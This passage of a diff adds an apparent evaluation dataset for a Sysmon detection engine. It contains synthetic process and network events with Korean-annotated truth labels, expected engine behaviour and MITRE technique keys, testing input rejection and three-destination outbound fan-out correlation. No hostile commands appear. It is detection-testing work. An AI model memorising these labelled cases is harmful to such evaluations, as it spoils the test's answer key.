+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-invalid-image",
+      "group_id": "invalid-image",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "프로세스 이미지 누락으로 입력이 거절되어 관제 정답을 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "파서가 개별 항목을 거절하거나 미지원으로 보고하고 지표 계산에서 제외합니다.",
+      "technique_truth": {
+        "T1105": "unknown",
+        "T1485": "unknown",
+        "T1489": "unknown",
+        "T1059": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 825,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "CommandLine": "notepad.exe",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-invalid-time",
+      "group_id": "invalid-time",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "두 시각 필드를 모두 누락하여 입력 거절과 평가 제외를 점검합니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "파서가 개별 항목을 거절하거나 미지원으로 보고하고 지표 계산에서 제외합니다.",
+      "technique_truth": {
+        "T1105": "unknown",
+        "T1485": "unknown",
+        "T1489": "unknown",
+        "T1059": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 826,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "Image": "C:\\Synthetic\\notepad.exe",
+            "CommandLine": "notepad.exe C:\\Synthetic\\invalid-time.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-unsupported",
+      "group_id": "unsupported-event",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "미지원 Sysmon Event ID라서 처리 및 평가 대상이 아닙니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "파서가 개별 항목을 거절하거나 미지원으로 보고하고 지표 계산에서 제외합니다.",
+      "technique_truth": {
+        "T1105": "unknown",
+        "T1485": "unknown",
+        "T1489": "unknown",
+        "T1059": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 22,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 827,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\notepad.exe",
+            "CommandLine": "notepad.exe C:\\Synthetic\\unsupported-event.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-normal-three",
+      "group_id": "fanout-three-outbound",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "positive",
+      "truth_reason": "정상 운영 중인 가상의 세 대상에 1분 동안 발신하므로 명시된 세 목적지 조건은 참입니다. 공격이나 스캔 정답은 아닙니다.",
+      "context": "benign",
+      "expected_engine_behavior": "발신 목적지 3개 상관 결과가 예상됩니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1000,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1001,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.2",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1002,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:01:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.3",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-two",
+      "group_id": "fanout-two",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "관찰 배치의 발신 목적지는 두 개여서 세 목적지 조건을 충족하지 않습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1010,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.10",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1011,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.11",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-duplicates",
+      "group_id": "fanout-duplicate",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "세 연결이지만 서로 다른 발신 목적지는 두 개입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "중복 목적지를 제거해 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1020,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.20",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1021,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.20",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1022,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:01:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.21",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-outbound-unknown",
+      "group_id": "fanout-unknown-direction",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "unknown",
+      "truth_reason": "세 번째 연결 방향이 기록되지 않아 실제 발신 세 목적지 조건은 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "방향 미상 기록을 집계하지 않아 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1030,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.30",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1031,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.31",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1032,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:01:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.32",
+            "DestinationPort": "443"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-inbound",
+      "group_id": "fanout-inbound",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "관찰된 세 연결 모두 수신이므로 발신 세 목적지 조건은 거짓입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "수신을 제외하여 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1040,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.40",
+            "DestinationPort": "443",
+            "Initiated": "false"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1041,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.41",
+            "DestinationPort": "443",
+            "Initiated": "false"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1042,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:01:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "198.51.100.42",
+            "DestinationPort": "443",
+            "Initiated": "false"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-exact-boundary",
+      "group_id": "fanout-time-boundary",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "positive",
+      "truth_reason": "관찰된 세 발신 대상은 정확히 10분 이내이고 경계 시각을 포함합니다.",
+      "context": "benign",
+      "expected_engine_behavior": "10분 경계를 포함한 상관 결과가 예상됩니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1050,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1051,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:05:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.2",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1052,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:10:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.3",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-outside-boundary",
+      "group_id": "fanout-time-boundary",
+      "split": "dev",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "첫 연결과 세 번째 연결이 10분 1초 떨어져 어느 10분 창에도 세 대상이 없습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1060,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.4",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1061,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:05:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.5",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1062,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:10:01.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.6",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-suspicious-three",
+      "group_id": "fanout-three-outbound",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "positive",
+      "truth_reason": "시나리오상 의심 맥락이지만 정답은 2초 내 발신 목적지 3개라는 조건에 한정됩니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "상관 결과는 조건 부합만 뜻하며 스캔이나 공격 확정이 아닙니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1070,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.10",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1071,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:01.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.11",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1072,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:02.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.12",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-mapped",
+      "group_id": "fanout-mapped",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "IPv4와 IPv4-mapped IPv6가 같은 주소여서 서로 다른 발신 목적지는 두 개입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "동일 주소 표현을 하나로 세어 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1080,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "192.0.2.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1081,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:10.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "::ffff:192.0.2.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1082,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:20.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "192.0.2.2",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-mapped-three",
+      "group_id": "fanout-mapped",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "positive",
+      "truth_reason": "IPv4 표기 중복을 제거하면 서로 다른 발신 목적지가 정확히 세 개입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "세 목적지에 대한 상관 결과가 예상됩니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1090,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "192.0.2.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1091,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:10.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "::ffff:192.0.2.1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1092,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:20.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "192.0.2.2",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1093,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:30.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
